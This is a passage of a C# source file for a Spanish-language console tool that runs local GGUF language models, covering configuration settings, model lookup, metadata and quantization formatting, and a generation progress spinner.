        SetConfigValue(key, value);
        config.Save();
        Console.WriteLine($"Configuración guardada: {key} = {value}");
        return 0;
    }

    private void SetConfigValue(string key, string value)
    {
        switch (key)
        {
            case "model-dir":
                config.ModelDirectory = value;
                break;
            case "runtime-dir":
                config.RuntimeDirectory = value.Equals("auto", StringComparison.OrdinalIgnoreCase) || value.Equals("none", StringComparison.OrdinalIgnoreCase) ? null : value;
                break;
            case "model":
                config.SelectedModel = value;
                break;
            case "context":
                config.ContextSize = ParseInt(value, "context");
                break;
            case "max-tokens":
                config.MaxTokens = ParseInt(value, "max-tokens");
                break;
            case "threads":
                config.Threads = ParseInt(value, "threads");
                break;
            case "gpu-layers":
                config.GpuLayers = ParseInt(value, "gpu-layers");
                break;
            case "temperature":
                config.Temperature = ParseDouble(value, "temperature");
                break;
            case "repeat-penalty":
                config.RepeatPenalty = ParseDouble(value, "repeat-penalty");
                break;
            case "top-p":
                config.TopP = ParseDouble(value, "top-p");
                break;
            case "chat-template":
                config.ChatTemplate = value;
                break;
            case "cache-type-k":
                config.CacheTypeK = value;
                break;
            case "cache-type-v":
                config.CacheTypeV = value;
                break;
            case "net":
            case "internet":
                config.NetEnabled = value is "on" or "si" or "sí" or "yes" or "true";
                break;
            case "security-tools":
            case "security":
                config.SecurityToolsEnabled = value is "on" or "si" or "sí" or "yes" or "true";
                break;
            case "cmd-mode":
            case "cmd":
                config.CmdMode = value.Equals("allowlist", StringComparison.OrdinalIgnoreCase) || value.Equals("seguro", StringComparison.OrdinalIgnoreCase) ? "allowlist" : "full";
                break;
            case "timeout":
                config.StartupTimeoutSeconds = ParseInt(value, "timeout");
                break;
            case "system-prompt":
                config.SystemPrompt = value;
                break;
            default:
                throw new TerminalException($"Clave desconocida: {key}");
        }
    }

    private ModelDescriptor ResolveModel(string? selector)
    {
        if (!catalog.TryResolve(selector ?? config.SelectedModel, out var model) || model is null)
        {
            if (string.IsNullOrWhiteSpace(selector ?? config.SelectedModel))
            {
                throw new TerminalException($"No se encontraron modelos GGUF en: {config.ModelDirectory}");
            }

            throw new TerminalException($"No se encontró el modelo '{selector ?? config.SelectedModel}'. Usa 'listar'.");
        }

        return model;
    }

    private void PrintBanner(ModelDescriptor model)
    {
        Banner.Render(config, model.Name);
    }

    private static void PrintHistory(ECnetServerSession session)
    {
        Console.WriteLine("Historial de la sesión:");
        for (var index = 0; index < session.History.Count; index++)
        {
            var message = session.History[index];
            Console.WriteLine($"[{index + 1}] {message.Role}: {Truncate(message.Content, 300)}");
        }
    }

    private static string Check(string value, bool success, string label)
    {
        return $"[{(success ? "OK" : "X")}] {label}: {value}";
    }

    private static string ReadOptionValue(string[] args, ref int index, string option)
    {
        if (index + 1 >= args.Length)
        {
            throw new TerminalException($"Falta el valor de {option}.");
        }

        index++;
        return args[index];
    }

    private static int ReadIntOption(string[] args, ref int index, string option)
    {
        return ParseInt(ReadOptionValue(args, ref index, option), option);
    }

    private static double ReadDoubleOption(string[] args, ref int index, string option)
    {
        return ParseDouble(ReadOptionValue(args, ref index, option), option);
    }

    private static int ParseInt(string value, string label)
    {
        if (!int.TryParse(value, NumberStyles.Integer, CultureInfo.InvariantCulture, out var result))
        {
            throw new TerminalException($"Valor inválido para {label}: {value}");
        }

        return result;
    }

    private static double ParseDouble(string value, string label)
    {
        if (!double.TryParse(value, NumberStyles.Float, CultureInfo.InvariantCulture, out var result))
        {
            throw new TerminalException($"Valor inválido para {label}: {value}");
        }

        return result;
    }

    private static string FormatBytes(long bytes)
    {
        string[] units = { "B", "KB", "MB", "GB", "TB" };
        double value = bytes;
        var unit = 0;
        while (value >= 1024 && unit < units.Length - 1)
        {
            value /= 1024;
            unit++;
        }

        return unit == 0 ? $"{bytes:N0} {units[unit]}" : $"{value:N2} {units[unit]}";
    }

    private static string Truncate(string value, int length)
    {
        if (value.Length <= length)
        {
            return value;
        }

        return value[..Math.Max(1, length - 3)] + "...";
    }

    private static object? MetadataValue(IReadOnlyDictionary<string, object?> metadata, string architecture, string suffix)
    {
        if (!string.IsNullOrWhiteSpace(architecture))
        {
            var key = $"{architecture}.{suffix}";
            if (metadata.TryGetValue(key, out var value))
            {
                return value;
            }
        }

        return null;
    }

    private static object? GeneralMetadataValue(IReadOnlyDictionary<string, object?> metadata, string key)
    {
        return metadata.TryGetValue(key, out var value) ? value : null;
    }

    private static string MetadataText(IReadOnlyDictionary<string, object?> metadata, string key)
    {
        return metadata.TryGetValue(key, out var value) ? Convert.ToString(value, CultureInfo.InvariantCulture) ?? string.Empty : string.Empty;
    }

    private static string? GeneralParameterCount(IReadOnlyDictionary<string, object?> metadata)
    {
        return metadata.TryGetValue("general.parameter_count", out var value) ? Convert.ToString(value, CultureInfo.InvariantCulture) : null;
    }

    private static string FormatParameterCount(string? value)
    {
        if (ulong.TryParse(value, NumberStyles.Integer, CultureInfo.InvariantCulture, out var count))
        {
            return $"{count:N0} ({count / 1_000_000_000d:0.00} B)";
        }

        return value ?? "desconocido";
    }

    private static string FormatValue(object? value)
    {
        return value switch
        {
            null => "desconocido",
            GgufArrayInfo array => array.ToString(),
            IFormattable formattable => formattable.ToString(null, CultureInfo.InvariantCulture) ?? string.Empty,
            _ => value.ToString() ?? string.Empty
        };
    }

    private static string QuantizationName(object? fileType, string fileName)
    {
        var value = fileType?.ToString();
        var name = value switch
        {
            "0" => "F32",
            "1" => "F16",
            "2" => "Q4_0",
            "3" => "Q4_1",
            "7" => "Q8_0",
            "8" => "Q5_0",
            "9" => "Q5_1",
            "10" => "Q2_K",
            "11" => "Q3_K_S",
            "12" => "Q3_K_M",
            "13" => "Q3_K_L",
            "14" => "Q4_K_S",
            "15" => "Q4_K_M",
            "16" => "Q5_K_S",
            "17" => "Q5_K_M",
            "18" => "Q6_K",
            "19" => "IQ2_XXS",
            "20" => "IQ2_XS",
            "21" => "Q3_K_XS",
            "22" => "IQ3_XXS",
            "23" => "IQ3_XS",
            "24" => "Q2_K_S",
            "25" => "IQ4_XS",
            "26" => "IQ4_NL",
            _ => string.Empty
        };
        if (!string.IsNullOrWhiteSpace(name))
        {
            return name;
        }

        var upper = fileName.ToUpperInvariant();
        var candidates = new[] { "Q2_K", "Q3_K", "Q4_K", "Q5_K", "Q6_K", "Q8_0", "F16", "F32" };
        return candidates.FirstOrDefault(candidate => upper.Contains(candidate, StringComparison.Ordinal)) ?? "no declarada";
    }

    private sealed class ConsoleCancelState
    {
        public CancellationTokenSource? Generation { get; set; }
    }

    private sealed class GenerationNotice : IDisposable
    {
        public static readonly object Sync = new();
        private readonly System.Threading.Timer timer;
        private int tokens;
        private readonly DateTime startTime = DateTime.UtcNow;
        private bool headerShown;
        private int spinnerIndex;
        private readonly string[] spinnerChars = { "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏" };

        public GenerationNotice()
        {
            timer = new System.Threading.Timer(_ => OnTick(), null, TimeSpan.FromMilliseconds(300), TimeSpan.FromMilliseconds(100));
        }

        public void OnToken()
        {
            var count = Interlocked.Increment(ref tokens);
            if (count == 1)
            {
                timer.Dispose();
                lock (Sync)
                {
                    if (!headerShown)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkBlue;
                        Console.Write("\rIA27: ");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        headerShown = true;
                    }
                }
            }
        }

        public void Dispose()
        {
            timer.Dispose();
        }

        public StatsSnapshot GetStats()
        {
            var elapsed = DateTime.UtcNow - startTime;
            var tps = elapsed.TotalSeconds > 0 ? Volatile.Read(ref tokens) / elapsed.TotalSeconds : 0;
            return new StatsSnapshot(Volatile.Read(ref tokens), elapsed, tps);
        }

        private void OnTick()
        {
            if (Volatile.Read(ref tokens) > 0)
            {
                return;
            }

            var spinner = spinnerChars[spinnerIndex % spinnerChars.Length];
            spinnerIndex++;
            lock (Sync)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write($"\rpensando... {spinner}  ");
            }
        }
    }

    private sealed record StatsSnapshot(int TotalTokens, TimeSpan Elapsed, double TokensPerSecond);

    private sealed record SessionAction(bool Exit, string? SwitchTo);
}
